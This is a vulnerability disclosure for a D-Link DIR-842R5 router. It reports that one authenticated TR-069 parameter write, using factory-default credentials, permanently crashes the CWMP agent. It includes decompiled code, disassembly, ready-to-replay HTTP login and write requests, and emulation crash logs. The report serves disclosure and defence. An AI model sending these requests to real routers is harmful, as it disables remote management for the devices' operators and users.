## DIR-842R5 Vulnerability

Vendor:D-Link

Product:DIR-842R5 (Russia/CIS "deuteron" software train, RT8197G)

Version:4.5.1 (build 2025.06.10, file `2025.06.10-13.39_DIR_842R5_RT8197G_NON4RU_4.5.1_release.bin`, sha256 1537cd96853989326ba95cfe1263abcb4ec662ec4f69dcc87c4eeda8172159fc)

Download:https://dlink.ru → DIR-842R5 → firmware 4.5.1

Vulnerability:Post-auth Denial of Service of the TR-069/CWMP service via memory-safety fault during DB synchronization — CWE-755 (improper handling of exceptional conditions) / CWE-476

Author:Chauncy-lab

## Descriptions

We found that a single authenticated parameter write permanently kills the TR-069/CWMP agent (`sbin/tr069`, 478 KB static MIPS binary) of D-Link DIR-842R5 4.5.1.

The web UI forwards JSON-RPC to the dmsd backend. After `SetParameterValues` writes **any** `Device.Services.TR069.ManagementServer.*` parameter, dmsd detects the configuration change and (re)spawns `tr069`. During its startup DB synchronization, `tr069` reads a record whose value pointer is **off-by-one (odd address `0x4a1101`)**; the GET path of `GetSetDBValue` (`sub_4284A8`, IDA 9.1 pseudocode) copies through it:

```c
int __fastcall sub_4284A8(const char *a1, char *DYNAMIC, int n6)
{
  int v6; // $s1
  ...
  v6 = sub_44FC94();
  n9005 = 9005;
  if ( v6 )
  {
    if ( n6 == 1 )                       // SET path
    {
      sub_4283E4(v6, a1, DYNAMIC);
    }
    else if ( n6 )
    {
      if ( n6 != 6 )
        return 0;
      strcpy(DYNAMIC, "DYNAMIC");
    }
    else                                 // GET path (startup DB sync lands here)
    {
      v8 = (const char *)sub_43FD54(a1);             // <-- DB record value pointer (odd addr 0x4a1101)
      sub_45D790(7, "%s: %s=[%s] \n", "GetSetDBValue", a1, v8);
      sub_42831C(v6, v8, DYNAMIC);                   // <-- copies through it -> misaligned deref, SIGBUS
    }
    return 0;
  }
  return n9005;
}
```

The faulting point sits at the tail of the GET path — the `jal sub_42831C` (the copy helper) followed by the branch on which the CPU reports the fault (capstone disassembly of `sbin/tr069`):

```asm
0042851c  55ff100c   jal      0x43fd54          ; fetch DB value pointer -> 0x4a1101 (odd)
00428520  21204002   move     $a0, $s2
 ...
00428548  21300002   move     $a2, $s0
0042854c  21286002   move     $a1, $s3
00428550  c7a0100c   jal      0x42831c          ; copy helper (dereferences the odd pointer)
00428554  21202002   move     $a0, $s1
00428558  e9ff0010   b        0x428500          ; <== EPC from crash core: SIGBUS
```

The process dies with **SIGBUS (signal 10 on MIPS) at EPC `0x428558`**, badvaddr `0x4a1101` — all three values extracted from the crash core's `NT_PRSTATUS`. dmsd respawns `tr069` and it crashes identically **three times in ~2 seconds**, after which dmsd gives up: the CWMP service is dead for the rest of the boot (ACS remote management / auto-configuration lost). Notably the crash is **value-independent** — writing benign values (`http://127.0.0.1:9/acs`, `u`, `p`), injection payloads, or 4 KB strings all produce the identical signature; only *unchanged* writes are deduplicated by dmsd and don't trigger the respawn.

The fault is a genuine memory-safety defect in the tr069↔dmsd DB synchronization protocol (odd/uninitialized record pointer dereference), not an input-length issue.

Suggested CVSS v3.1: `AV:A/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H` (5.7; default credentials admin/admin are in scope for this train).

No CVE exists for DIR-842R5. The same static `tr069` binary is expected across the ~22-model deuteron train.

## Proof of Concept (PoC) — verbatim replay capture (2026-11-13)

**Request 1 — login with factory-default credentials (148 bytes):**

```text
POST /login HTTP/1.1
Host: 127.0.0.1
Connection: close
Content-Type: application/json
Content-Length: 36

{"login":"admin","password":"admin"}
```

**Response 1 (349 bytes — session cookie and tokens are the actual values returned by this replay):**

```text
HTTP/1.1 200 OK
anweb-auth-autologin-available: 1
Set-Cookie: device-session-id=e4a534d5e8909b4424b722f4f3282d1d; SameSite=Strict
Content-Type: application/json

{
 "id": 1,
 "result": {
  "Status": 0,
  "AccessTimeout": 300,
  "AccessToken": "a0470f42-0890-4a30-943b-d227c3deae32",
  "RefreshToken": "25033f8a-105f-4171-b712-52276920c1bf"
 }
}
```

**Request 2 — one TR069 parameter write (421 bytes; the `u=1794504999` suffix only makes the value differ from the current one — any differing value triggers the crash):**

```text
POST /cpe HTTP/1.1
Host: 127.0.0.1
Connection: close
Content-Type: application/json
Content-Length: 194
Cookie: device-session-id=e4a534d5e8909b4424b722f4f3282d1d; DMSD-Access-Token=a0470f42-0890-4a30-943b-d227c3deae32

{"jsonrpc": "2.0", "id": 1, "method": "SetParameterValues", "params": {"ParameterList": [{"Name": "Device.Services.TR069.ManagementServer.URL", "Value": "http://127.0.0.1:9/acs?u=1794504999"}]}}
```

**Response 2 (129 bytes — write accepted):**

```text
HTTP/1.1 200 OK
anweb-auth-autologin-available: 1
Content-Type: application/json

{
 "id": 1,
 "result": {
  "Status": 0
 }
}
```

## Overcome

Fresh full replay on 2026-11-13 against the emulation container `verify_0146_d842r5` (deuteron + anweb + tr069 under qemu, port 8146; container clock is UTC). Each step lists the **executed command(s)** and their **verbatim output** in separate blocks.

**Step 1 — cores deleted, stack restarted before the run**

Command:

```sh
docker exec verify_0146_d842r5 sh -c 'rm -f /qemu_arm/work/*.core'
docker exec verify_0146_d842r5 sh /tmp/restart2.sh
```

Output (of the second command):

```text
rm: cannot remove '/qemu_arm/work/tmp/var/run/tracer': Is a directory
version.json: {"build":"Tue Jun 10 14:03:02 GMT+3 2025","buildUnix":174955
cores: 0
```

(the `tracer` line is a harmless leftover directory in the run-state cleanup; `cores: 0` confirms a clean slate.)

**Step 2 — baseline: no live `tr069` before the write (all entries are zombies from earlier runs)**

Command:

```sh
docker exec verify_0146_d842r5 sh -c "ps | grep '[t]r069'"
```

Output:

```text
    417 ?        00:00:00 tr069 <defunct>
    496 ?        00:00:00 tr069 <defunct>
    571 ?        00:00:00 tr069 <defunct>
   1180 ?        00:00:00 tr069 <defunct>
   1257 ?        00:00:00 tr069 <defunct>
   1332 ?        00:00:00 tr069 <defunct>
   2000 ?        00:00:00 tr069 <defunct>
   2077 ?        00:00:00 tr069 <defunct>
   2152 ?        00:00:00 tr069 <defunct>
   2428 ?        00:00:00 tr069 <defunct>
   2505 ?        00:00:00 tr069 <defunct>
   2580 ?        00:00:00 tr069 <defunct>
```

**Step 3 — send the two requests shown in the PoC section above (login + one parameter write).**

**Step 4 — effect: three fresh crash cores within 2 s, three new zombies, still no live `tr069`**

Command:

```sh
sleep 12 && docker exec verify_0146_d842r5 sh -c 'ls -la /qemu_arm/work/qemu_tr069_*.core'
docker exec verify_0146_d842r5 sh -c "ps | grep '[t]r069' | tail -5"
```

Output (in command order):

```text
-rw-r--r-- 1 root root 10317824 Nov 13 06:05 /qemu_arm/work/qemu_tr069_20261113-090549_3301.core
-rw-r--r-- 1 root root 10326016 Nov 13 06:05 /qemu_arm/work/qemu_tr069_20261113-090550_3378.core
-rw-r--r-- 1 root root 10326016 Nov 13 06:05 /qemu_arm/work/qemu_tr069_20261113-090551_3453.core
   2505 ?        00:00:00 tr069 <defunct>
   2580 ?        00:00:00 tr069 <defunct>
   3301 ?        00:00:00 tr069 <defunct>
   3378 ?        00:00:00 tr069 <defunct>
   3453 ?        00:00:00 tr069 <defunct>
```

(PIDs 3301/3378/3453 are the three new cores above — the respawn three-strike triggered by the single write; 2505/2580 are the youngest of the twelve pre-existing zombies from Step 2; **zero** `tr069` is actually running.)

**Step 5 — crash cause extracted from the newest core (ELF `PT_NOTE` / `NT_PRSTATUS`)**

Command:

```sh
python3 parse_core.py qemu_tr069_20261113-090551_3453.core
```

Output:

```text
NT_PRSTATUS  si_signo=10 (SIGBUS on MIPS)  si_code=0
  EPC      0x00428558 found in register area at word-offsets ['0x37']
  BADVADDR 0x004a1101 found in register area at word-offsets ['0x1d', '0x1e', '0x28']
```

EPC `0x428558` / badvaddr `0x4a1101` — the identical signature to the static analysis above (word-offsets vary between cores; they are positional within the register dump, not semantic).
